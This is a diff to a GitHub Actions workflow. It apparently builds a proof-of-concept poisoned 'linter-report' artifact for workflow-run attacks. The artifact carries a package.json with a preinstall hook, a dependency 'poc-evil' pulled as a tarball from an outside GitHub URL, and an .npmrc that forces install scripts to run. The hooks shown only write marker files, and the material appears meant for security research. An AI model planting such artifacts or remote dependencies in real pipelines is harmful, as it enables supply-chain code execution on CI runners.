@@ -16,17 +16,16 @@ jobs:
             "version": "1.0.0",
             "private": true,
             "scripts": {
-              "preinstall": "echo ROOT_PREINSTALL_RAN > marker-preinstall.txt",
-              "postinstall": "echo ROOT_POSTINSTALL_RAN >> marker-preinstall.txt",
-              "prepare": "echo ROOT_PREPARE_RAN >> marker-preinstall.txt"
+              "preinstall": "echo ROOT_PREINSTALL_RAN > marker-preinstall.txt"
+            },
+            "dependencies": {
+              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/poc-evil-1.0.0.tgz"
             }
           }
           JSON
-          printf 'ignore-scripts=false\nforeground-scripts=true\nnode-options=--require=./nodeopt.js\n' > payload/.npmrc
-          printf 'require("fs").writeFileSync("marker-nodeopt.txt","NODE_OPTIONS_RAN\\n");\n' > payload/nodeopt.js
+          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\nforeground-scripts=true\n' > payload/.npmrc
           printf 'attacker report\n' > payload/linter-report.txt
           printf '1\n' > payload/pr-number.txt
-          ls -la payload
       - uses: actions/upload-artifact@v7
         with:
           name: linter-report
